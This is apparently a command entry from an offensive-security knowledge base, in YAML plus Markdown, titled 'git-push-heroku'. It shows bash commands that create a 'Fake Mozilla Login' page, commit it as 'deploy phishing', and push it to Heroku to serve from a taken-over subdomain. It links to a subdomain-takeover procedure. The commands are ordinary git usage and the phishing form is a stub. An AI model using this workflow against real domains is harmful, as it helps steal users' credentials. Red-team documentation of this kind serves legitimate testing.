---
id: c5h6i7j8-k9l0-1235-hijk-8901234567
data: |-
  git init
  echo '<h1>Fake Mozilla Login</h1><form>...</form>' > index.html
  git add .
  git commit -m "deploy phishing"
  git push heroku main
tags:
  - deployment
  - git
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T04:51:10.612Z'
verified: false
validated: true
submitted: true
---
# git-push-heroku

## Command

```bash
git init
echo '<h1>Fake Mozilla Login</h1><form>...</form>' > index.html
git add .
git commit -m "deploy phishing"
git push heroku main
```

## Description

Initializes a Git repo, adds content, and pushes to Heroku to deploy on the taken-over subdomain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `git init` | Initialize repo | Yes |
| `echo ... > index.html` | Create content file | Yes |
| `git add .` | Stage files | Yes |
| `git commit -m "..."` | Commit changes | Yes |
| `git push heroku main` | Deploy to Heroku | Yes |

## Examples

### Basic Usage

```bash
git push heroku main
```

### Advanced Usage

```bash
heroku git:remote -a app-name
git push heroku main
```

## Expected Output

'Pushing to https://git.heroku.com/app-name.git ... done.'

## Related

- [[Related Procedure|procedures/Host-Arbitrary-Content-on-Taken-Over-Subdomain]]
